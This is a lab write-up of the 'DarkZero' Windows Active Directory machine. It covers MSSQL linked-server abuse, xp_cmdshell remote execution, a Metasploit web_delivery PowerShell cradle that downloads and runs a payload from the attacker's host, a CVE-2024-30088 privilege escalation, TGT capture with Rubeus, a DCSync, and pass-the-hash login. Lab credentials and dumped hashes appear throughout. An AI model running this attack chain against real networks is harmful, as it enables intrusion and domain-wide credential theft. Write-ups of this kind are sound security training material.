---
created: 2025-10-08
---

📅 `2025-10-08`

#active-directory #mssql #mssql-links #kernel-exploit #tgt #dcsync #metasploit

----

## 🖥️ Box Info

| ️🏷️ Name         |  `DarkZero`   |
| --------------- | --- |
| 📆 Release Date |   `2025-10-04`  |
| 🌐 IP Address   |  `10.10.11.89`   |
| 🖥️ OS           |   `Windows`  |
| 🎯 Difficulty   |   `Hard`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `MSSQL` links
- `xp_cmdshell` on linked server
- Kernel exploit
- Two domains
- Internal network machine
- `DCSync`

**🛠️ Tools:**  

- `NetExec`
- `impacket-mssqlclient`
- `metasploit`
- `Rubeus`
- `impacket-ticketConverter`
- `impacket-secretsdump`

**📚 Learned:**  

- If we can't upload/download with `penelope` because of internal routing, try `meterpreter`.
- Force a machine to log into our compromised machine using `xp_dirtree`.
- `Rubeus` monitor to extract `TGT`s.
- Convert `.kirbi` into `.ccache` using `impacket-ticketConverter`.
- Log in with `impacket` tools using `Kerberos` with `-k` and `-no-pass`, exporting the `KRB5CCNAME` environment variable.

----

## 🌐 Port Scan

- **TCP**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 5985, ...

---

## 🔍 Enumeration

This box is from an assumed breach perspective. The domain user they give us is:

- `john.w`:`RFulUtONCOL!`

I found some interesting ports, and judging from some of them we are facing a Domain Controller. The `nmap` scan and `NetExec` reveal that the domain is `darkzero.htb`.

I found that our user has access to `mssql` (apart from `SMB` and `LDAP`). I logged in with `impacket-mssqlclient`.

```shell
impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

SQL (darkzero\john.w  guest@master)>
```


---

## 🪜 Foothold

I had no permissions to enable `xp_cmdshell`. I could list directories with `xp_dirtree` but I didn't find anything. I decided to enumerate linked servers with `enum_links` and found this:

```shell
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

Let's try executing commands on this server.

```shell
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell 'dir'
ERROR(DC02): Line 1: Incorrect syntax near 'dir'.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
darkzero-ext\svc_sql
```

Got `RCE` on `DC02.darkzero.ext`.

>[!tip]
>Use double quotes for hostnames with dots (`.`) on them.

I decided to get a `meterpreter` shell as it could probably make this easier. I used the web delivery module.

>[!warning]
>`penelope`'s upload and download functions didn't work here. It may have to do with the routing, as `DC02` is on the internal network (`172.16.20.0/24`) and we can access it only by routing through `DC01`.

```
$ msfconsole -q -x "use exploit/multi/script/web_delivery; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST tun0; \
  set LPORT 443; \
  set target 2; \
  exploit -j"
[*] Using configured payload python/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
LHOST => tun0
LPORT => 443
target => 2
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.14:443 

[*] Using URL: http://10.10.14.14:8080/s5hn9T3E
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABkAHgAWAA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJABkAHgAWAAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAGQAeABYAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAMAAvAHMANQBoAG4AOQBUADMARQAvAEwATQBpAGwAVgBvAGYAUwAzAGoAcAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAMAAvAHMANQBoAG4AOQBUADMARQAnACkAKQA7AA==
```

Now run the command on `DC02.darkzero.ext` using the `mssql` session and receive the shell.

```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABkAHgAWAA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJABkAHgAWAAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAGQAeABYAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAMAAvAHMANQBoAG4AOQBUADMARQAvAEwATQBpAGwAVgBvAGYAUwAzAGoAcAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAMAAvAHMANQBoAG4AOQBUADMARQAnACkAKQA7AA==
```

And we got a `meterpreter` shell. I tried running `local_exploit_suggester` but it errored out. I decided to upload `winpeas`.

```
meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp
meterpreter > upload /usr/share/peass/winpeas/winPEASx64.exe
[*] Uploading  : /usr/share/peass/winpeas/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 8.00 MiB of 9.70 MiB (82.51%): /usr/share/peass/winpeas/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 9.70 MiB of 9.70 MiB (100.0%): /usr/share/peass/winpeas/winPEASx64.exe -> winPEASx64.exe
[*] Completed  : /usr/share/peass/winpeas/winPEASx64.exe -> winPEASx64.exe
meterpreter > ls
Listing: C:\Temp
================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100777/rwxrwxrwx  10166784  fil   2025-10-08 23:16:13 -0500  winPEASx64.exe
meterpreter > shell
Process 2992 created.
Channel 2 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Temp>.\winPEASx64.exe
```

Searching for vulnerabilities in this Windows version, I found it was vulnerable to `CVE-2024-30088`, which has a `metasploit` module.

```
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/script/web_delivery) > use exploit/windows/local/cve_2024_30088_authz_basep 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2024_30088_authz_basep) > options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.161    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 1
SESSION => 1
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LPORT 1234
LPORT => 1234
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
```

---

## 👤 User

The exploit kept erroring out, and switching to `pwnbox` didn't help. What worked was to upload a malicious reverse shell `.exe` with a stageless payload. This wasn't possible with `web_delivery` since the `PowerShell` command was too long. I caught the reverse shell with `multi/handler` and ran the exploit. This time it worked, and we are now `NT AUTHORITY\SYSTEM`. Here are the steps:

1. Open a `msfconsole` and start a `web_delivery` listener with a staged payload (the stageless one is too long to pass with `PowerShell`). Copy the command and paste it into the `xp_cmdshell` of `DC02.darkzero.ext`.
2. After catching the reverse shell, upload the malicious file generated with `msfvenom` with a stageless payload (`windows/x64/meterpreter_reverse_tcp`).
3. Start a `multi/handler` listener in another `msfconsole` with a different port.
4. Execute the reverse shell from the `web_delivery` `meterpreter` shell.
5. After catching the stageless reverse shell in the second `msfconsole`, background it and run the `cve_2024_30088` module with the stageless session and on another port. This gives us an `NT AUTHORITY\SYSTEM` session.

```
C:\Users\Administrator>whoami
nt authority\system

C:\Users\Administrator\Desktop>dir

 Directory of C:\Users\Administrator\Desktop

10/09/2025  01:00 AM    <DIR>          .
09/29/2025  11:14 AM    <DIR>          ..
10/09/2025  01:05 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,347,607,552 bytes free
```

Got user. `user.txt` was on the administrator's desktop on `DC02.darkzero.ext`.

I also ran `hashdump` and saved the output just in case.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
```

---

## 🛡️ Privilege Escalation

We have a trust from `darkzero.ext` to `darkzero.htb`. We already compromised `darkzero.ext`, and our goal is to compromise `darkzero.htb`.

![[Pasted image 20251008224054.png]]

I got stuck here and needed several hints. The solution involves forcing `DC01` to authenticate to our compromised `DC02` and capture the machine account's `TGT`, which can be used to perform a `DCSync` attack.

I uploaded `Rubeus.exe` from our `NT AUTHORITY\SYSTEM` session and ran the following command:

- `.\Rubeus.exe monitor /interval:5 /nowrap`

Now `Rubeus` is listening. I'll start another `impacket-mssqlclient` on `DC01` and use `xp_dirtree` to list a file on our compromised `DC02.darkzero.ext`. This triggers an authentication attempt from the machine account to our compromised server.

```
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\test
```

And in `DC02` this appears:

```
[*] 10/9/2025 11:23:05 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/9/2025 3:58:56 AM
  EndTime               :  10/9/2025 1:58:56 PM
  RenewTill             :  10/16/2025 3:58:56 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZFhBI5zbe+O8rs0fVEFRaX0uAeMTJUjZliXcP/626fu6wwPmwSiHi+QajsHiS6yWx+nAb0xpkIp6hqHhjNKU2gYFBnV/NQPjBI/Gbeen/yp9Wpu65VSzPXsF/G/pwRu7KTIW4X+9vJ6rGmkARMkrS8C2cAyUjDEJMuELhIRA6SGPZXgXUkRJkA4yvpBqPDGYfiTKNxvNoIKEfX5bHlB4hHpMSVYNwyKQ+yIG4Ruqaq/zWMj5ag9ihCyGzSPQR90H8FX17SvIbUl44b/lccqb8q3KrRrp6njIrkd3KSo6bfdfjfOW2mnHm88mLoasY5ItklObDcRmWOB32lMdik2oHKuodSkDdUUCELNXQ6rp286seqT02LCGmd8/hhylFoLMUzET8hMzfiHEfHpX0aArlBG8tSTB7f8gGaZiTAy0/2WTKr8bwCDB2SaQvDgfCZ6tX/MVkmBarHMs0t1LnpTZqzyLadawHoPz3DdH17zbu9rTMjkqlQVFNzPmJ2P/eAxML4GCeJQ+ji1hH81eyoKpEKkwloAlKmCUJ0P5NGRk3CUTOxkCxlHy9j+5LjX/G9ptBgc8uKd2kT7jJrLcdDyyA7XPEpwZQ9qdBznZF6DRS4xcK9Pm9wF8suqOK47UfLgN30SlJ5dXLL7YYwhmRiIc4uS/ON+0xb45t5jzcP6JQiBxgmQpqznHMZUQ7g25XpHT6/2SaGjQ1cwv0UljjO8og/6lk5tdgWE1fRj4eZbMWwhPsKvZK9gh55LkzuuBCZQH8FYVTnu7CWckigHgRWwuGx0ebFEfyxg2kRx3heNCVwhxzBn1yDPn+jPPyJbZ0RtUVahpRePiEdUFEr15pRUyqRNzhHfi9E62G/VMPQExuI7WJAORS9JOGekc09sIhDCOxPcY5rDDruTtfYuxeQhvOCW8wEIJFto646recydMOA1ew3jWGnJsBEE2N0BqH1UUtnHqY5l491TsmrIc11A/9HrSx906YYTkF3LjHGnjB4dYYDMdGHdpekg0U08sRqiiUk7hYtqq7qMCd9x5FF+mW7hduI01hQ6J85vyWlnCcnkp+OVPYDz0t6fm+e9rLUi71Wg86Cj3QVz0adb9Dkl2KNJhk0mBjZPX4hx7qdWlbgMjArORVh9PYaYXPCLSAi5YdPJT88YRlYBP7dR8G0HnKJJGHJMJeMb89K38/5f7tW8sOMvmdNzwi9oe63ycLtcKSGk1+BcTl9TxolpFumXyc/Aveh2cLSs6+pa1G1S6g/aN4HpZXjlSjrmtZjfTjYvBjBsngUgfq+Vv1nh1RqosFUV4FlxInEyUkvOhOjYopcSd5AsDP0M4XdDmGkBUExGOR1SFZKdzR60HtPPB9UQkD192rIQ7dyzj35T93HyqLIZj29Jcb99WtCKXsQ2wCzlPK1z3S/p/JupurNGU/dTD8IFK7CK3iNo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgL+0EB074Xpj8n17SzVkD77FQUUZPn9gozKcR3RfjximhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDkxMDU4NTZaphEYDzIwMjUxMDA5MjA1ODU2WqcRGA8yMDI1MTAxNjEwNTg1NlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
```

This is a `base64` encoded `TGT` for the user `DC01$` in `.kirbi` format. We can just copy the `base64` and decode it into a file called `dc01.kirbi`.

```shell
$ echo "doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZFhBI5zbe+O8rs0fVEFRaX0uAeMTJUjZliXcP/626fu6wwPmwSiHi+QajsHiS6yWx+nAb0xpkIp6hqHhjNKU2gYFBnV/NQPjBI/Gbeen/yp9Wpu65VSzPXsF/G/pwRu7KTIW4X+9vJ6rGmkARMkrS8C2cAyUjDEJMuELhIRA6SGPZXgXUkRJkA4yvpBqPDGYfiTKNxvNoIKEfX5bHlB4hHpMSVYNwyKQ+yIG4Ruqaq/zWMj5ag9ihCyGzSPQR90H8FX17SvIbUl44b/lccqb8q3KrRrp6njIrkd3KSo6bfdfjfOW2mnHm88mLoasY5ItklObDcRmWOB32lMdik2oHKuodSkDdUUCELNXQ6rp286seqT02LCGmd8/hhylFoLMUzET8hMzfiHEfHpX0aArlBG8tSTB7f8gGaZiTAy0/2WTKr8bwCDB2SaQvDgfCZ6tX/MVkmBarHMs0t1LnpTZqzyLadawHoPz3DdH17zbu9rTMjkqlQVFNzPmJ2P/eAxML4GCeJQ+ji1hH81eyoKpEKkwloAlKmCUJ0P5NGRk3CUTOxkCxlHy9j+5LjX/G9ptBgc8uKd2kT7jJrLcdDyyA7XPEpwZQ9qdBznZF6DRS4xcK9Pm9wF8suqOK47UfLgN30SlJ5dXLL7YYwhmRiIc4uS/ON+0xb45t5jzcP6JQiBxgmQpqznHMZUQ7g25XpHT6/2SaGjQ1cwv0UljjO8og/6lk5tdgWE1fRj4eZbMWwhPsKvZK9gh55LkzuuBCZQH8FYVTnu7CWckigHgRWwuGx0ebFEfyxg2kRx3heNCVwhxzBn1yDPn+jPPyJbZ0RtUVahpRePiEdUFEr15pRUyqRNzhHfi9E62G/VMPQExuI7WJAORS9JOGekc09sIhDCOxPcY5rDDruTtfYuxeQhvOCW8wEIJFto646recydMOA1ew3jWGnJsBEE2N0BqH1UUtnHqY5l491TsmrIc11A/9HrSx906YYTkF3LjHGnjB4dYYDMdGHdpekg0U08sRqiiUk7hYtqq7qMCd9x5FF+mW7hduI01hQ6J85vyWlnCcnkp+OVPYDz0t6fm+e9rLUi71Wg86Cj3QVz0adb9Dkl2KNJhk0mBjZPX4hx7qdWlbgMjArORVh9PYaYXPCLSAi5YdPJT88YRlYBP7dR8G0HnKJJGHJMJeMb89K38/5f7tW8sOMvmdNzwi9oe63ycLtcKSGk1+BcTl9TxolpFumXyc/Aveh2cLSs6+pa1G1S6g/aN4HpZXjlSjrmtZjfTjYvBjBsngUgfq+Vv1nh1RqosFUV4FlxInEyUkvOhOjYopcSd5AsDP0M4XdDmGkBUExGOR1SFZKdzR60HtPPB9UQkD192rIQ7dyzj35T93HyqLIZj29Jcb99WtCKXsQ2wCzlPK1z3S/p/JupurNGU/dTD8IFK7CK3iNo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgL+0EB074Xpj8n17SzVkD77FQUUZPn9gozKcR3RfjximhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDkxMDU4NTZaphEYDzIwMjUxMDA5MjA1ODU2WqcRGA8yMDI1MTAxNjEwNTg1NlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=" | base64 -d > dc01.kirbi
```

And now use `impacket-ticketConverter` to convert it into a `.ccache` file, which we can use as the environment variable `KRB5CCNAME` to authenticate using `Kerberos` with our tools.

```shell
$ impacket-ticketConverter dc01.kirbi dc01.ccache

$ export KRB5CNAME=dc01.ccache
```

We have to fix the clock skew or the `DCSync` will fail.

```shell
$ sudo timedatectl set-ntp off
$ sudo rdate -n 10.10.11.89
Thu Oct  9 06:06:33 -05 2025
```

And now, let's do `DCSync`.

```shell
$ impacket-secretsdump -k -no-pass -dc-ip 10.10.11.89 'darkzero.htb/dc01$@dc01.darkzero.htb'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
<SNIP>
```

That gave us the domain `Administrator`'s hash:

- `5917507bdf2ef2c2b0a869a1cba40726`

We can now log into `DC01.darkzero.htb` via `WinRM`.

```shell
$ evil-winrm-py -i 10.10.11.89 -u 'Administrator' -H '5917507bdf2ef2c2b0a869a1cba40726'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.10.11.89:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator> cd Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         10/8/2025   1:20 AM             34 root.txt                                                              
-ar---         10/8/2025   1:20 AM             34 user.txt
```

Rooted.
